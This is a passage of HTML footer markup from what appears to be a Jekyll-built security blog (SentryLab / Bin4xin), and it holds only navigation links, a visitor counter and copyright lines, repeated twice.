                  <p class="thuhidden"><a href="https://www.sentrylab.cn/blog/2019/jekyll/in/linux/" target="blank">博客搭建教程</a></p>
                  <p class="thuhidden"><a href="https://about.sentrylab.cn/news/sentry-lab-markdown-usage/" target="blank">个性化语法批注</a></p>
                  <p class="thuhidden"><a href="https://www.sentrylab.cn/blog/2019/nginx/with/jekyll-site/" target="blank">公网部署</a></p>
                  </div>

                  <div class="col-sm-6">
                  <p class="thuhidden"><strong>社区</strong></p>
                  <p class="thuhidden"><a href="/blog" target="blank">博客</a></p>
                  <p class="thuhidden"><a href="https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV" target="blank"><em>Collection of verified vulnerabilities</em></a></p>
                  <p class="thuhidden"><a href="https://github.com/Bin4xin/bigger-than-bigger" target="blank"><em>Bigger than Bigger</em></a></p>
                  <p class="thuhidden"><a href="https://github.com/Bin4xin/B4xinSynchronize" target="blank"><em>B4xinSynchronize</em></a></p>
                  </div>
            </div>

            <div class="col-sm-4">
                  <div class="col-sm-6">
                    <p class="thuhidden"><strong>开发</strong></p>
                    <p class="thuhidden"><a href="https://github.com/Bin4xin/Bin4xin" target="blank"><em>Bin4xin</em></a></p>
                    <p class="thuhidden"><a href="https://www.cloudflare.com/waf/" target="blank"><em>CloudFlare WAF</em></a></p>
                    <p class="thuhidden"><a href="https://jekyllrb.com/docs/" target="blank"><em>Jekyll</em></a></p>
                    <p class="thuhidden"><a href="https://www.markdownguide.org/" target="blank"><em>MarkDown</em></a></p>
                    <p class="share">
                    <a href="https://github.com/Bin4xin/" target="blank"><i class="fa fa-github"></i></a>
                    <a href="https://twitter.com/Bin4xin/"><i class="fa fa-twitter" target="blank"></i></a>
                    <a href="#"><i class="fa fa-facebook" target="blank"></i></a>
                    </p>
                  </div>

                  <div class="col-sm-6">
                    <p class="thuhidden"><strong>关于</strong></p>
                    <p class="thuhidden"><a href="https://about.sentrylab.cn/" target="blank">近期研究</a></p>
                    <p class="thuhidden">∑ <csmall>(Visitors/times)</csmall></em></p>
                    <img src="https://profile-counter.glitch.me/bin4xin.github.io/count.svg" style="max-width:100%;">
                  </div>
            </div>

        <div class="col-sm-4">
          
          <img src="/static/img/logo-small@3x.png" />

        </div>
    </div><!--/row -->
    
    <p class="thuhidden">© 2019-2021 SentrySec, Lab. Build by Jekyll under the terms of the MIT License.</p>

  </div>
</div>




<div id="footerwrap" class="tuna-foot-2">
<div class="container">
    <div class="row">
            <div class="col-sm-4">
                <div class="col-sm-6">
                  <p class="thuhidden"><strong>入门</strong></p>
                  <p class="thuhidden"><a href="https://github.com/tuna/mirror-web" target="blank"><em>Jekyll</em>源码</a></p>
                  <p class="thuhidden"><a href="https://www.sentrylab.cn/blog/2019/jekyll/in/linux/" target="blank">博客搭建教程</a></p>
                  <p class="thuhidden"><a href="https://about.sentrylab.cn/news/sentry-lab-markdown-usage/" target="blank">个性化语法批注</a></p>
                  <p class="thuhidden"><a href="https://www.sentrylab.cn/blog/2019/nginx/with/jekyll-site/" target="blank">公网部署</a></p>
                  </div>

                  <div class="col-sm-6">
                  <p class="thuhidden"><strong>社区</strong></p>
                  <p class="thuhidden"><a href="/blog" target="blank">博客</a></p>
                  <p class="thuhidden"><a href="https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV" target="blank"><em>Collection of verified vulnerabilities</em></a></p>
                  <p class="thuhidden"><a href="https://github.com/Bin4xin/bigger-than-bigger" target="blank"><em>Bigger than Bigger</em></a></p>
                  <p class="thuhidden"><a href="https://github.com/Bin4xin/B4xinSynchronize" target="blank"><em>B4xinSynchronize</em></a></p>
                  </div>
            </div>

            <div class="col-sm-4">
                  <div class="col-sm-6">
                    <p class="thuhidden"><strong>开发</strong></p>
                    <p class="thuhidden"><a href="https://github.com/Bin4xin/Bin4xin" target="blank"><em>Bin4xin</em></a></p>
                    <p class="thuhidden"><a href="https://www.cloudflare.com/waf/" target="blank"><em>CloudFlare WAF</em></a></p>
                    <p class="thuhidden"><a href="https://jekyllrb.com/docs/" target="blank"><em>Jekyll</em></a></p>
                    <p class="thuhidden"><a href="https://www.markdownguide.org/" target="blank"><em>MarkDown</em></a></p>
                    <p class="share">
                    <a href="https://github.com/Bin4xin/" target="blank"><i class="fa fa-github"></i></a>
                    <a href="https://twitter.com/Bin4xin/"><i class="fa fa-twitter" target="blank"></i></a>
                    <a href="#"><i class="fa fa-facebook" target="blank"></i></a>
                    </p>
                  </div>

                  <div class="col-sm-6">
                    <p class="thuhidden"><strong>关于</strong></p>
                    <p class="thuhidden"><a href="https://about.sentrylab.cn/" target="blank">近期研究</a></p>
                    <p class="thuhidden">∑ <csmall>(Visitors/times)</csmall></em></p>
                    <img src="https://profile-counter.glitch.me/bin4xin.github.io/count.svg" style="max-width:100%;">
                  </div>
            </div>

        <div class="col-sm-4">
          
          <img src="/static/img/logo-small@3x.png" />

        </div>
    </div><!--/row -->
    
    <p class="thuhidden">© 2019-2021 SentrySec, Lab. Build by Jekyll under the terms of the MIT License.</p>

  </div>
</div>


</body>

<script src="/static/js/help.js"></script>
</html>
<!--
vim: ts=2 sts=2 sw=2 noexpandtab
-->
